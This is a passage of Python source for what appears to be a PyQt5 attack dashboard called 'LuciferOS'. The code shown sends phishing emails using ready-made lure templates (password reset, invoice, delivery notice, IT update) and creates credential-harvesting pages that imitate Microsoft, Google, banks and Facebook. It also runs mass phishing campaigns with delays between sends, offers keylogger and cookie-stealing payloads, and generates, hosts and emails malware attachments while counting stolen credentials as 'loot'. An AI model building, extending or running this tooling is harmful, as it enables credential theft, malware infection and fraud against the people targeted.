            target=self._send_phishing_thread,
            args=(to, template, attack_url),
            daemon=True
        ).start()
    
    def _send_phishing_thread(self, to, template, attack_url):
        try:
            response = requests.post(
                f"{self.backend_url}/email/phish",
                json={
                    'to': to,
                    'template': template,
                    'attack_url': attack_url
                },
                timeout=120  # Increased timeout
            )
            if response.ok:
                data = response.json()
                if data.get('success'):
                    self.log_signal.emit(f"Phishing email SENT to {to}")
                    note = data.get('note', '')
                    msg = f"[SENT] Phishing email delivered to {to}"
                    if note:
                        msg += f"\nNote: {note}"
                    from PyQt5.QtCore import QMetaObject, Q_ARG, Qt
                    QMetaObject.invokeMethod(self.email_output, "append",
                        Qt.QueuedConnection, Q_ARG(str, msg))
                else:
                    error = data.get('error', 'Unknown error')
                    self._email_log(f"Send failed: {error}")
                    self.log_signal.emit(f"Send failed: {error}")
            else:
                self._email_log(f"API error: {response.status_code}")
                self.log_signal.emit(f"API error: {response.status_code}")
        except requests.exceptions.Timeout:
            self._email_log("Timeout - email may still be sending in background")
            self.log_signal.emit("Email operation timed out - check backend logs")
        except Exception as e:
            self._email_log(f"Send error: {str(e)}")
            self.log_signal.emit(f"Send error: {str(e)}")
    
    def preview_phishing_email(self):
        """Preview the phishing email template"""
        template = self.phish_template.currentText()
        attack_url = self.phish_attack_url.text() or "http://your-server/harvest"
        
        templates = {
            'password_reset': f'''Subject: Urgent: Password Reset Required

Dear User,

We've detected unusual activity on your account. 
For your security, please reset your password immediately.

[Reset Password Now] → {attack_url}

If you did not request this, please ignore this email.

Security Team''',
            'invoice': f'''Subject: Invoice #12345 - Payment Required

Dear Customer,

Please find attached your invoice for recent services.
Amount Due: $299.99
Due Date: 2026-02-15

[View Invoice & Pay] → {attack_url}''',
            'document_share': f'''Subject: John Smith shared a document with you

John Smith has shared a file with you:
"Q4_Report_2025.pdf"

[Open] → {attack_url}''',
            'account_verification': f'''Subject: Action Required: Verify Your Account

Your account will be suspended in 24 hours 
unless you verify your information.

[Verify Now] → {attack_url}''',
            'delivery_notification': f'''Subject: Your package is waiting for delivery

We attempted to deliver your package but 
were unable to complete delivery.

Tracking Number: ABC123456789

[Confirm Address] → {attack_url}''',
            'it_support': f'''Subject: [IT Support] System Update Required

Dear Employee,

Your workstation requires a critical security update.

[Install Update] → {attack_url}

This update is mandatory within 24 hours.

IT Support Team'''
        }
        
        preview = templates.get(template, "Template not found")
        self.email_output.setText(f"=== PREVIEW: {template} ===\n\n{preview}")
    
    def create_credential_harvester(self):
        """Create a credential harvesting page using attack server"""
        template = self.phish_template.currentText()
        # Map template names to attack server templates
        template_map = {
            'password_reset': 'microsoft',
            'invoice': 'generic',
            'document_share': 'google',
            'account_verification': 'microsoft',
            'delivery_notification': 'generic',
            'it_support': 'vpn',
            'bank_alert': 'bank',
            'social_media': 'facebook',
        }
        harvester_template = template_map.get(template, 'microsoft')
        
        self._email_log(f"Creating {harvester_template} credential harvester...")
        threading.Thread(
            target=self._create_harvester_thread,
            args=(harvester_template,),
            daemon=True
        ).start()
    
    def _create_harvester_thread(self, template):
        try:
            response = requests.post(
                f"{self.backend_url}/attack/harvester",
                json={'template': template},
                timeout=30
            )
            if response.ok:
                data = response.json()
                if data.get('success'):
                    local_url = data.get('local_url', '')
                    public_url = data.get('public_url', '')
                    campaign_id = data.get('campaign_id', '')
                    
                    self.log_signal.emit(f"Harvester created: {local_url}")
                    
                    # Update the attack URL field on main thread
                    from PyQt5.QtCore import QMetaObject, Q_ARG, Qt
                    QMetaObject.invokeMethod(self.phish_attack_url, "setText",
                        Qt.QueuedConnection, Q_ARG(str, local_url))
                    
                    msg = f"[OK] Credential Harvester Created!\n"
                    msg += f"   Campaign ID: {campaign_id}\n"
                    msg += f"   Local URL: {local_url}\n"
                    msg += f"   Public URL: {public_url}\n"
                    msg += f"\n   Use this URL in phishing emails!"
                    msg += f"\n   Captured credentials will be saved automatically."
                    QMetaObject.invokeMethod(self.email_output, "append",
                        Qt.QueuedConnection, Q_ARG(str, msg))
                else:
                    self.log_signal.emit(f"Harvester failed: {data.get('error')}")
            else:
                self.log_signal.emit(f"API error: {response.status_code}")
        except Exception as e:
            self.log_signal.emit(f"Harvester error: {str(e)}")
    
    def launch_mass_phishing(self):
        """Launch mass phishing campaign"""
        targets_text = self.mass_phish_targets.text().strip()
        if not targets_text:
            QMessageBox.warning(self, "Error", "Please enter target email addresses")
            return
        
        targets = [t.strip() for t in targets_text.split(',') if t.strip()]
        if not targets:
            QMessageBox.warning(self, "Error", "No valid targets found")
            return
        
        attack_url = self.phish_attack_url.text().strip()
        if not attack_url:
            QMessageBox.warning(self, "Error", "Please enter an attack URL")
            return
        
        template = self.phish_template.currentText()
        
        # Confirm before launching
        reply = QMessageBox.question(
            self, "Confirm Mass Phishing",
            f"Send {template} phishing email to {len(targets)} targets?\n\nTargets: {', '.join(targets[:3])}{'...' if len(targets) > 3 else ''}",
            QMessageBox.Yes | QMessageBox.No
        )
        
        if reply == QMessageBox.Yes:
            self._email_log(f"Launching campaign to {len(targets)} targets...")
            threading.Thread(
                target=self._mass_phishing_thread,
                args=(targets, template, attack_url),
                daemon=True
            ).start()
    
    def _mass_phishing_thread(self, targets, template, attack_url):
        try:
            response = requests.post(
                f"{self.backend_url}/email/mass_phish",
                json={
                    'targets': targets,
                    'template': template,
                    'attack_url': attack_url,
                    'delay': [30, 120]  # 30-120 seconds between emails
                },
                timeout=600  # 10 min timeout for mass send
            )
            if response.ok:
                data = response.json()
                sent = len(data.get('sent', []))
                failed = len(data.get('failed', []))
                
                self.log_signal.emit(f"Mass phishing complete: {sent} sent, {failed} failed")
                from PyQt5.QtCore import QMetaObject, Q_ARG, Qt
                QMetaObject.invokeMethod(self.email_output, "append",
                    Qt.QueuedConnection, Q_ARG(str, f"[CAMPAIGN] Sent: {sent} | Failed: {failed}"))
            else:
                self.log_signal.emit(f"Campaign failed: {response.status_code}")
        except Exception as e:
            self.log_signal.emit(f"Campaign error: {str(e)}")
    
    def embed_payload(self):
        """Embed payload into email HTML"""
        payload_type = self.payload_type.currentText()
        self._email_log(f"Embedding {payload_type} payload...")
        
        # For now just show instructions - actual embedding happens server-side
        instructions = {
            'tracking_pixel': "Tracking pixel will be added to track email opens",
            'keylogger': "JavaScript keylogger will capture keystrokes on phishing page",
            'form_stealer': "Form data interceptor will capture all form submissions",
            'cookie_stealer': "Cookie exfiltrator will capture all cookies",
            'credential_phish': "Login form interceptor will capture credentials before redirect",
            'session_hijack': "Session data exfiltrator will capture cookies, localStorage, sessionStorage"
        }
        
        self.email_output.append(f"[PAYLOAD] {payload_type}: {instructions.get(payload_type, 'Unknown')}")
        self.email_output.append("Payload will be embedded when email is sent.")
    
    def refresh_harvest_stats(self):
        """Refresh the harvest statistics"""
        threading.Thread(target=self._refresh_stats_thread, daemon=True).start()
    
    def _refresh_stats_thread(self):
        try:
            response = requests.get(f"{self.backend_url}/collect/stats", timeout=10)
            if response.ok:
                data = response.json()
                opens = data.get('total_email_opens', 0)
                creds = data.get('total_credentials', 0)
                datas = data.get('total_data_collected', 0)
                
                from PyQt5.QtCore import QMetaObject, Q_ARG, Qt
                QMetaObject.invokeMethod(self.harvest_stats_label, "setText",
                    Qt.QueuedConnection, Q_ARG(str, f"Opens: {opens} | Credentials: {creds} | Data: {datas}"))
                
                # Also update loot counter
                QMetaObject.invokeMethod(self.loot_label, "setText",
                    Qt.QueuedConnection, Q_ARG(str, f"Opens:{opens} Creds:{creds} Data:{datas}"))
        except Exception as e:
            self.log_signal.emit(f"Stats refresh error: {str(e)}")
    
    # ===== MALWARE ATTACHMENT METHODS =====
    
    def generate_malware(self):
        """Generate malware payload, host it, and fill in the URL"""
        malware_type = self.malware_type_combo.currentText()
        
        self._email_log(f"Generating and hosting {malware_type} malware...")
        threading.Thread(
            target=self._generate_malware_thread,
            args=(malware_type,),
            daemon=True
        ).start()
    
    def _generate_malware_thread(self, malware_type):
        try:
            # Use the attack/payload endpoint which generates AND hosts the malware
            response = requests.post(
                f"{self.backend_url}/attack/payload",
                json={
                    'malware_type': malware_type
                },
                timeout=30
            )
            if response.ok:
                data = response.json()
                if data.get('success'):
                    filename = data.get('filename', '')
                    size = data.get('size', 0)
                    local_url = data.get('local_url', '')
                    public_url = data.get('public_url', '')
                    instructions = data.get('instructions', '')
                    
                    self.log_signal.emit(f"Malware generated and hosted: {filename}")
                    
                    # Update the payload URL field on main thread
                    from PyQt5.QtCore import QMetaObject, Q_ARG, Qt
                    QMetaObject.invokeMethod(self.malware_payload_url, "setText",
                        Qt.QueuedConnection, Q_ARG(str, local_url))
                    
                    msg = f"[MALWARE] Generated and Hosted!\n"
                    msg += f"   File: {filename}\n"
                    msg += f"   Size: {size} bytes\n"
                    msg += f"   Download URL: {local_url}\n"
                    msg += f"   Public URL: {public_url}\n"
                    msg += f"   Instructions: {instructions}\n"
                    msg += f"\n   This URL is now live and will track downloads!"
                    QMetaObject.invokeMethod(self.email_output, "append",
                        Qt.QueuedConnection, Q_ARG(str, msg))
                else:
                    self.log_signal.emit(f"Generation failed: {data.get('error')}")
            else:
                self.log_signal.emit(f"API error: {response.status_code}")
        except Exception as e:
            self.log_signal.emit(f"Malware generation error: {str(e)}")
    
    def create_full_campaign(self):
        """One-click: Create harvester + malware + auto-fill all URLs"""
        phish_type = self.phish_template_combo.currentText().lower()
        malware_type = self.malware_type_combo.currentText() if hasattr(self, 'malware_type_combo') else 'macro_doc'
        
        # Map phishing template to harvester template
        template_map = {
            'microsoft 365 login': 'microsoft',
            'google workspace alert': 'google',
            'password expiry': 'outlook',
            'document shared': 'office365',
            'voicemail notification': 'generic',
            'invoice attached': 'generic',
            'linkedin invitation': 'linkedin',
            'facebook security': 'facebook',
            'bank alert': 'bank'
        }
        harvester_template = template_map.get(phish_type, 'generic')
        
        self._email_log(f"⚡ Creating FULL CAMPAIGN...")
        self._email_log(f"   Harvester: {harvester_template} | Malware: {malware_type}")
        
        def run_campaign():
            try:
                response = requests.post(
                    f"{self.backend_url}/attack/full_campaign",
                    json={
                        'harvester_template': harvester_template,
                        'payload_type': malware_type,
                        'payload_name': f"urgent_document.{malware_type.split('_')[-1] if '_' in malware_type else 'exe'}"
                    },
                    timeout=60
                )
                
                if response.ok:
                    data = response.json()
                    if data.get('success'):
                        harvester_url = data.get('harvester', {}).get('local_url', '')
                        payload_url = data.get('payload', {}).get('local_url', '')
                        campaign_id = data.get('campaign_id', 'unknown')
                        
                        # Auto-fill both URL fields
                        from PyQt5.QtCore import QMetaObject, Q_ARG, Qt
                        if harvester_url:
                            QMetaObject.invokeMethod(
                                self.phish_attack_url, "setText",
                                Qt.QueuedConnection, Q_ARG(str, harvester_url)
                            )
                        if payload_url:
                            QMetaObject.invokeMethod(
                                self.malware_payload_url, "setText",
                                Qt.QueuedConnection, Q_ARG(str, payload_url)
                            )
                        
                        msg = f"""
╔══════════════════════════════════════════════════════════════╗
║           ⚡ FULL CAMPAIGN CREATED ⚡                        ║
╠══════════════════════════════════════════════════════════════╣
║ Campaign ID: {campaign_id[:40]:<40}      ║
╠══════════════════════════════════════════════════════════════╣
║ HARVESTER ({harvester_template}):                            ║
║   {harvester_url[:56]:<56} ║
╠══════════════════════════════════════════════════════════════╣
║ MALWARE ({malware_type}):                                    ║
║   {payload_url[:56]:<56} ║
╠══════════════════════════════════════════════════════════════╣
║ ✓ Both URLs auto-filled in fields above                      ║
║ ✓ Ready to send phishing emails!                             ║
╚══════════════════════════════════════════════════════════════╝
"""
                        QMetaObject.invokeMethod(
                            self.email_output, "append",
                            Qt.QueuedConnection, Q_ARG(str, msg)
                        )
                        self.log_signal.emit(f"⚡ Full campaign ready: {campaign_id[:20]}...")
                    else:
                        error = data.get('error', 'Unknown error')
                        self._email_log(f"Campaign creation failed: {error}")
                else:
                    self._email_log(f"Campaign API error: {response.status_code}")
            except Exception as e:
                self._email_log(f"Campaign error: {str(e)}")
        
        threading.Thread(target=run_campaign, daemon=True).start()
    
    def send_malware_email(self):
        """Send email with malware attachment"""
        to = self.phish_to.text().strip()
        malware_type = self.malware_type_combo.currentText()
        payload_url = self.malware_payload_url.text().strip()
        
        if not to:
            QMessageBox.warning(self, "Error", "Please enter a target email address")
            return
        
        # Confirm before sending
        reply = QMessageBox.question(
            self, "Confirm Malware Email",
            f"Send {malware_type} malware attachment to {to}?\n\n"
            f"This will create and attach a malicious file.",
            QMessageBox.Yes | QMessageBox.No
        )
        
        if reply == QMessageBox.Yes:
            self._email_log(f"Sending {malware_type} malware to {to}...")
            threading.Thread(
                target=self._send_malware_email_thread,
                args=(to, malware_type, payload_url),
                daemon=True
            ).start()
    
    def _send_malware_email_thread(self, to, malware_type, payload_url):
        try:
            response = requests.post(
                f"{self.backend_url}/email/malware",
                json={
                    'to': to,
                    'malware_type': malware_type,
                    'payload_url': payload_url or None
                },
                timeout=120  # Increased timeout for email operations
            )
            if response.ok:
                data = response.json()
                if data.get('success'):
                    filename = data.get('malware_filename', 'unknown')
                    instructions = data.get('instructions', '')
                    note = data.get('note', '')
                    
                    self.log_signal.emit(f"Malware email SENT to {to}")
                    
                    from PyQt5.QtCore import QMetaObject, Q_ARG, Qt
                    msg = f"[SENT] Malware email to {to}\nAttachment: {filename}"
                    if note:
                        msg += f"\nNote: {note}"
                    if instructions:
                        msg += f"\nInstructions: {instructions}"
                    QMetaObject.invokeMethod(self.email_output, "append",
                        Qt.QueuedConnection, Q_ARG(str, msg))
                else:
                    error = data.get('error', 'Unknown error')
                    self._email_log(f"Send failed: {error}")
                    self.log_signal.emit(f"Send failed: {error}")
            else:
                self._email_log(f"API error: {response.status_code}")
                self.log_signal.emit(f"API error: {response.status_code}")
        except requests.exceptions.Timeout:
            self._email_log(f"Timeout - email may still be sending in background")
            self.log_signal.emit("Email operation timed out - check backend logs")
        except Exception as e:
            self._email_log(f"Malware email error: {str(e)}")
            self.log_signal.emit(f"Malware email error: {str(e)}")


def main():
    """Main entry point with attack mode selection"""
    app = QApplication(sys.argv)
    
    # Show attack mode selector first
    selector = AttackModeSelector()
    
    if selector.exec_() == QDialog.Accepted:
        config = selector.get_config()
        print(f"[LUCIFERA] Attack mode selected: {config.get('mode_name')}")
        print(f"[LUCIFERA] Target: {config.get('target', 'Not specified')}")
        
        # Launch main dashboard with config
        window = LuciferOSDashboard(attack_config=config)
        window.show()
        
        return app.exec_()
    else:
        print("[LUCIFERA] Attack mode selection cancelled")
        return 0


if __name__ == '__main__':
    sys.exit(main())
